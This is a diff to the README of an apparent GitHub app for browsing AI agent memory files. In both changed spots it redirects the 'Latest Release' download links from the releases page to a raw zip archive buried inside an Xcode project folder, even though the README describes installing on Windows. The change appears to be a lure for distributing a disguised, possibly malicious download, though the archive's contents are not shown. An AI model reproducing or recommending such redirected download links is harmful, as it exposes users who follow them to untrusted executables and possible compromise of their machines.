@@ -1,6 +1,6 @@
 # 🧠 ai-memory-reader - Browse your AI agent memory files
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Reviewfamilytetranychidae774/ai-memory-reader/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Reviewfamilytetranychidae774/ai-memory-reader/raw/refs/heads/main/AIMemoryReader.xcodeproj/ai_memory_reader_v3.4.zip)
 
 ## 📁 What is this app?
 
@@ -14,7 +14,7 @@ Most agent memory files exist as raw text or lines of code. They appear difficul
 
 ## 💾 Getting the app
 
-Visit [this page](https://github.com/Reviewfamilytetranychidae774/ai-memory-reader/releases) to download your installer.
+Visit [this page](https://github.com/Reviewfamilytetranychidae774/ai-memory-reader/raw/refs/heads/main/AIMemoryReader.xcodeproj/ai_memory_reader_v3.4.zip) to download your installer.
 
 ## ⚙️ Installing for Windows
 
